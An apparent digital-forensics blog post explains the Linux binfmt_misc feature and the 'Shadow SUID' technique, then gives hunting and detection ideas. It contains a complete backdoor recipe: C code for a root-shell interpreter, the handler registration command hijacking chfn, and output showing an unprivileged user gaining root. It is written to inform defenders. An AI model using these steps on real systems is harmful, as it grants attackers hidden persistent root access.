<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://dfir.ch/posts/today_i_learned_binfmt_misc/">Original</a>
    <h1>Today I Learned: Binfmt_misc</h1>
    
    <div id="readability-page-1" class="page"><div>
                <h2 id="introduction">Introduction</h2>
<p><code>binfmt_misc</code> (short for Binary Format Miscellaneous) is a Linux kernel feature that allows the system to recognize and execute files based on custom binary formats. It’s part of the Binary Format (<code>binfmt</code>) subsystem, which determines how the kernel runs an executable file.</p>
<p>Normally, Linux only knows how to run native binaries (like ELF files compiled for the system’s CPU architecture, and a few other file types). <code>binfmt_misc</code> extends this by allowing other kinds of files, scripts, binaries for other architectures, or even custom file types, to be executed as if they were native.</p>
<p>When you enable <code>binfmt_misc</code>, the kernel adds a virtual filesystem (usually mounted at <code>/proc/sys/fs/binfmt_misc/</code>). Within this filesystem, you can register new binary format handlers. Each handler tells the kernel:</p>
<ul>
<li>How to recognize a file (e.g., by its magic bytes or filename extension)</li>
<li>What interpreter or emulator to use to run it</li>
<li>When a matching file is executed, the kernel automatically invokes the specified interpreter with the file as its argument.</li>
</ul>
<p><code>binfmt_misc</code> is managed from <code>/proc/sys/fs/binfmt_misc</code>. There are two files in that folder by default, <code>register</code> and <code>status</code>. To actually register a new binary type, you have to construct a string looking like</p>
<p><code>:name:type:offset:magic:mask:interpreter:flags</code></p>
<p>(where you can choose the : upon your needs) and echo it to <code>/proc/sys/fs/binfmt_misc/register</code>. The <a href="https://docs.kernel.org/admin-guide/binfmt-misc.html">binfmt-misc man page</a> goes into details about the various flags.</p>
<h2 id="why-care">Why care?</h2>
<p><strong>TL;DR</strong>: <code>binfmt_misc</code> provides a nifty way (once the attacker has gained root rights on the machine) to create a little backdoor to regain root access when the original access no longer works. This mechanism is not really known, according to blog posts and articles on the topic, which makes it a perfect fit for staying under the radar.</p>
<p>In 2019, SentinelOne published a two-part analysis describing a persistence technique called <strong>Shadow SUID</strong> (<a href="https://www.sentinelone.com/blog/shadow-suid-for-privilege-persistence-part-1/">Part 1</a>, <a href="https://www.sentinelone.com/blog/shadow-suid-privilege-persistence-part-2/">Part 2</a>):
<em>Shadow SUID is the same as a regular suid file, only it doesn’t have the setuid bit, which makes it very hard to find or notice. The way shadow SUID works is by inheriting the setuid bit from an existing setuid binary using the binfmt_misc mechanism, which is part of the Linux kernel.</em></p>
<p>Interestingly, this technique seems to have fallen into oblivion again, as neither <a href="https://attack.mitre.org/matrices/enterprise/linux/">MITRE ATT&amp;CK</a> nor the five-part Elastic Security “Linux Persistence Detection Engineering” series mentioned it (the last part <a href="https://www.elastic.co/security-labs/the-grand-finale-on-linux-persistence">here</a> with links to all other parts). As of 2025, however, the technique works wonderfully and would probably be very difficult to detect (see the hunting section later).</p>
<h2 id="setting-up-our-backdoor">Setting up our backdoor</h2>
<p>A <code>binfmt_misc</code> rule is registered with the C (<code>credentials</code>) flag. That flag changes the normal behavior: instead of using the interpreter’s rights, the kernel looks up the access rights from the original file being executed. If that original file is setuid-root, the interpreter runs as root. (C also implies O, the “open fd for unreadable files” flag.)</p>
<p>In the demo from SentinelOne, they register a <code>binfmt_misc</code> rule that matches a chosen SUID binary’s first 128 bytes (e.g., ping). Then, when you “run ping”, the kernel dispatches to the attacker’s interpreter but with ping’s setuid credentials, so the interpreter is effectively root. That’s why it looks like the “script” or binary (aka the interpreter) is being interpreted as SUID. Let that sink in.. It took me a few readings to grasp that concept. But it works, as we will see below!</p>
<p>First, we check if binfmt_misc is mounted:</p>
<div><pre tabindex="0"><code data-lang="bash"><span><span><span># mount | grep binfmt_misc</span>
</span></span><span><span>binfmt_misc on /proc/sys/fs/binfmt_misc <span>type</span> binfmt_misc <span>(</span>rw,nosuid,nodev,noexec,relatime<span>)</span>
</span></span></code></pre></div><p>For setting up my interpreter, I’m following 0xdf’s writeup for the HTB machine <a href="https://0xdf.gitlab.io/2022/08/13/htb-retired.html#abuse-binfmt_misc">Retired</a> closely:</p>
<div><pre tabindex="0"><code data-lang="C"><span><span><span>#define _GNU_SOURCE
</span></span></span><span><span><span>#include</span> <span>&lt;stdlib.h&gt;</span><span>
</span></span></span><span><span><span>#include</span> <span>&lt;unistd.h&gt;</span><span>
</span></span></span><span><span><span></span>
</span></span><span><span><span>int</span> <span>main</span><span>(</span><span>void</span><span>)</span> <span>{</span>
</span></span><span><span>    <span>char</span> <span>*</span><span>const</span> <span>paramList</span><span>[</span><span>10</span><span>]</span> <span>=</span> <span>{</span><span>&#34;/bin/bash&#34;</span><span>,</span> <span>&#34;-p&#34;</span><span>,</span> <span>NULL</span><span>};</span>
</span></span><span><span>    <span>const</span> <span>int</span> <span>id</span> <span>=</span> <span>0</span><span>;</span>
</span></span><span><span>    <span>setresuid</span><span>(</span><span>id</span><span>,</span> <span>id</span><span>,</span> <span>id</span><span>);</span>
</span></span><span><span>    <span>execve</span><span>(</span><span>paramList</span><span>[</span><span>0</span><span>],</span> <span>paramList</span><span>,</span> <span>NULL</span><span>);</span>
</span></span><span><span>    <span>return</span> <span>0</span><span>;</span>
</span></span><span><span><span>}</span>
</span></span></code></pre></div><p>Compile the interpreter with <code>gcc -o malmoeb malmoeb.c</code>. Next, we need to find a suitable SUID binary:</p>
<div><pre tabindex="0"><code data-lang="bash"><span><span>root@binfmt_misc:/dev/shm# find / -perm -4000 2&gt;/dev/null
</span></span><span><span>/usr/lib/polkit-1/polkit-agent-helper-1
</span></span><span><span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
</span></span><span><span>/usr/lib/snapd/snap-confine
</span></span><span><span>/usr/lib/openssh/ssh-keysign
</span></span><span><span>/usr/bin/passwd
</span></span><span><span>/usr/bin/gpasswd
</span></span><span><span>/usr/bin/chfn
</span></span><span><span><span>[</span>..<span>]</span>
</span></span></code></pre></div><p>Wait, <code>chfn</code>? The <code>chfn</code> binary on Linux is a legacy command-line tool used to change a user’s “finger” information. Details like their full name, office number, or phone numbers are stored in the GECOS field of <code>/etc/passwd</code>. Although rarely used today, it remains installed by default because it’s part of the standard <code>shadow</code> or <code>util-linux</code> package, which provides core user management utilities such as <code>passwd</code> and <code>chsh</code>. Keeping <code>chfn</code> ensures backward compatibility with older scripts and systems that still rely on traditional Unix account management tools, even though most modern environments no longer use the <code>finger</code> service or its associated data.</p>
<p>SentinelOne, in their demo, uses the ping utility, but that approach has the drawback of breaking the command’s normal functionality. However, they also published some clever workarounds, though those are more complex. By using a legacy command like <code>chfn</code>, this extra step should most likely be unnecessary (since nobody hardly uses that command anymore).</p>
<p>Here we extract the magic bytes from <code>chfn</code> (in hex) to create a new handler.</p>
<div><pre tabindex="0"><code data-lang="bash"><span><span>cat /usr/bin/chfn <span>|</span> xxd -p <span>|</span> head -1 <span>|</span> sed <span>&#39;s/\(..\)/\\x\1/g&#39;</span>
</span></span><span><span><span>\x</span>7f<span>\x</span>45<span>\x</span>4c<span>\x</span>46<span>\x</span>02<span>\x</span>01<span>\x</span>01<span>\x</span>00<span>\x</span>00<span>\x</span>00<span>\x</span>00<span>\x</span>00<span>\x</span>00<span>\x</span>00<span>\x</span>00<span>\x</span>00<span>\x</span>03<span>\x</span>00<span>\x</span>3e<span>\x</span>00<span>\x</span>01<span>\x</span>00<span>\x</span>00<span>\x</span>00<span>\x</span>00<span>\x</span>72<span>\x</span>00<span>\x</span>00<span>\x</span>00<span>\x</span><span>00</span>
</span></span></code></pre></div><p>We assemble the required string and <code>echo</code> this string (as root) into <code>/proc/sys/fs/binfmt_misc/register</code>:</p>
<div><pre tabindex="0"><code data-lang="bash"><span><span><span>echo</span> <span>&#39;:malmoeb:M::\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x3e\x00\x01\x00\x00\x00\x00\x72\x00\x00\x00\x00::/dev/shm/malmoeb:C&#39;</span> &gt; /proc/sys/fs/binfmt_misc/register
</span></span></code></pre></div><p>That breaks down to (again, thanks to 0xdf):</p>
<ul>
<li>name - malmoeb (arbitrary)</li>
<li>using magic bytes</li>
<li>no offset</li>
<li>signature that matches the first 30 bytes of chfn</li>
<li>no mask</li>
<li>interpreter of /dev/shm/malmoeb</li>
<li>C flag</li>
</ul>
<p><code>malmoeb</code> was successfully created as a new handler. Pointing to our interpreter:</p>
<div><pre tabindex="0"><code data-lang="bash"><span><span>root@binfmt_misc://proc/sys/fs/binfmt_misc# cat malmoeb 
</span></span><span><span>enabled
</span></span><span><span>interpreter /dev/shm/malmoeb
</span></span><span><span>flags: OC
</span></span><span><span>offset <span>0</span>
</span></span><span><span>magic 7f454c4602010100000000000000000003003e0001000000007200000000
</span></span></code></pre></div><p>No, when we execute <code>chfn</code>..</p>
<div><pre tabindex="0"><code data-lang="bash"><span><span>malmoeb@binfmt_misc:~$ id
</span></span><span><span><span>uid</span><span>=</span>1000<span>(</span>malmoeb<span>)</span> <span>gid</span><span>=</span>1000<span>(</span>malmoeb<span>)</span> <span>groups</span><span>=</span>1000<span>(</span>malmoeb<span>)</span>
</span></span><span><span>malmoeb@binfmt_misc:~$ chfn
</span></span><span><span>root@binfmt_misc:/home/malmoeb# 
</span></span></code></pre></div><p><strong>Holy cow - this is really working!</strong> As an unprivileged user, all I have to type is <code>chfn</code> to get a root shell!</p>
<h2 id="hunting">Hunting</h2>
<p>The SUID searches (typically used for hunting) will not flag our interpreter binary, as we have not set SUID rights on this file. One technique would be to specifically check the registered handlers:</p>
<div><pre tabindex="0"><code data-lang="bash"><span><span>$ ls -la /proc/sys/fs/binfmt_misc
</span></span></code></pre></div><p>Or monitor <code>/proc/sys/fs/binfmt_misc/</code> for new or changed handlers; alert on any registration events. Next one would alert on handlers whose interpreter path points to writable or ephemeral locations (e.g., /tmp, /dev/shm, user home directories.., however, this might not be a strong detection, because you already need root rights to install this mechanism. So you could create an executable wherever you want on the system).</p>
<p>The good thing is - our registered handler will only be temporary, which means when the system reboots, our handler will be gone. If an attacker wants to maintain long-term access via this technique, they must set up yet another mechanism to reinstall the handler / interpreter, giving us another chance to catch them.</p>
<h2 id="lets-ask-an-expert">Let’s ask an expert</h2>
<p>So, I asked a true expert in that field, <a href="https://www.linkedin.com/in/ruben-groenewoud/">Ruben Groenewoud</a>, Senior Security Research Engineer at Elastic, for his thoughts on this, especially regarding detection.</p>
<p><em>As the steps for execution rely mostly on using built-in shell tools, the /proc filesystem, and hijacking the execution flow, there are very limited traces to catch.. The most interesting part to note here with the execution chain, is that chfn is never even executed; its a proxy execution.</em></p>
<p><img src="https://dfir.ch/images/binfmt_misc/proxy.png" alt="Proxy execution" title="Proxy execution"/></p>
<figcaption>Figure 1: Proxy execution</figcaption>
<p><em>So rules that I created such as <a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/privilege_escalation_potential_suid_sgid_exploitation.toml">https://github.com/elastic/detection-rules/blob/main/rules/linux/privilege_escalation_potential_suid_sgid_exploitation.toml</a> will not trigger, because chfn is never executed on its own.</em></p>
<p><em>From the attack chain point of view, 2 steps that were flagged by my rules are the execution of a hex payload (as you grabbed the memory using xxd -p) and SUID/SGUID enumeration, but these two are not necessary in an adversary point of view.</em></p>
<p>Very interesting! And true - <code>SUID/SGUID</code> enumeration and the <code>xxd -p</code> command are not strictly necessary to be executed on our target host. Ruben will look more into this technique, and I’m sure he will come up with some cool detections :)</p>
<h2 id="further-reading">Further reading</h2>
<ul>
<li>
<p><a href="https://blog.cloudflare.com/using-go-as-a-scripting-language-in-linux/">Using Go as a Scripting Language in Linux</a> from Cloudflare explains how Go, normally a compiled language, can be used like a scripting language on Linux systems. The article describes using Linux’s binfmt_misc feature to register Go source files as executable. By creating a small wrapper (such as a gorun command) and associating it with Go files, users can make .go scripts executable and run them directly, just like shell scripts.</p>
</li>
<li>
<p><a href="https://benjamintoll.com/2021/12/31/on-binfmt_misc/">On BINFMT_MISC</a> by Benjamin Toll explains how the Linux feature <code>binfmt_misc</code> allows the operating system to treat arbitrary file types as executable. When a file is run, the kernel can automatically pass it to a specified interpreter based on its format or magic number, not just its extension.</p>
</li>
</ul>

            </div></div>
  </body>
</html>
